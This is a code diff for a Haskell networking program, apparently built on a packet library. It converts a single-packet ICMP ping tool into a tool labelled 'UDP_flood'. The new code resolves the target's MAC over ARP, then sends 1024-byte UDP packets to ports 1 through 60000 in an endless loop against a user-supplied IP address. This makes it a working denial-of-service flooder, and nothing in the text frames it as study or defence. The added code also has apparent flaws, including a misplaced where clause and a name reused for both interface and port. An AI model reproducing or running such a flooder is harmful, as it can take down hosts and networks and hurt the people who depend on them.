@@ -3,20 +3,20 @@ module Main where
 
 import qualified Data.ByteString.Lazy as B
 import Data.Maybe
-import Control.Lens
 import Network.Connector
-import Control.Monad
+import Control.Lens
 import Network.Packet
+import Data.Word
 import qualified Network.Ethernet as E
-import qualified Network.ARP as A
 import qualified Network.IP as I
-import qualified Network.ICMP as IC
+import qualified Network.ARP as A
+import qualified Network.UDP as U
 import qualified Network.Payload as P
 import System.Environment
 import System.Exit
 import Data.IORef
 
-usage   = putStrLn "Usage: ping interface ip"
+usage   = putStrLn "Usage: UDP_flood interface ip"
 noIface = putStrLn "Error: no interface found with given name"
 exit    = exitWith ExitSuccess
 die     = exitWith (ExitFailure 1)
@@ -30,14 +30,15 @@ arpreq i m t = (E.ethernet & E.source .~ m
                     & A.tha .~ (read "00:00:00:00:00:00"::MACAddr)
                     & A.tpa .~ (read t::IPAddr))
 
-request::IPAddr->String->MACAddr->MACAddr->(E.Ethernet:+:I.IP:+:IC.ICMP:+:P.Payload)
-request si di sm dm = 	(E.ethernet 	& E.dest   .~ dm 
-										& E.source .~ sm) +++ 
-						(I.ip 	& I.source .~ si
-					  			& I.dest   .~ (read di::IPAddr)
-					  			& I.ttl	 .~ 64) +++ 
-						(IC.icmpEchoRequest) +++
-						(P.payload & P.content .~ (B.pack [0..47]))
+packet::IPAddr->String->MACAddr->MACAddr->Word16->(E.Ethernet:+:I.IP:+:U.UDP:+:P.Payload)
+packet si di sm dm randport =	(E.ethernet & E.source 	.~ sm
+											& E.dest 	.~ dm)+++
+								(I.ip 		& I.source 	.~ si
+											& I.dest 	.~ (read di::IPAddr))+++
+								(U.udp 		& U.source 	.~ 12345
+											& U.dest	.~ randport)+++
+								(P.payload 	& P.content .~ (B.pack (concat $ replicate 4 [0..255])))
+
 main = do
 	args <- getArgs
 	if length args /= 2 then usage >> die
@@ -53,7 +54,6 @@ main = do
 			ptr<-newIORef Nothing
 			readPacket i ptr
 			arpresp <- readIORef ptr
-			let getmac = (^.A.sha) . (^._2) . get2 . fromJust . toARP
-			sendPacket i $ request sip dip sha (getmac arpresp)
-			filterPacket i "icmp"
-			printPacket i >> exit
+			mapM_ (sendPacket i) $ [packet sip dip sha (getmac arpresp) i |i<-(concat $ repeat [1..60000])]
+				where getmac = (^.A.sha) . (^._2) . get2 . fromJust . toARP 
+
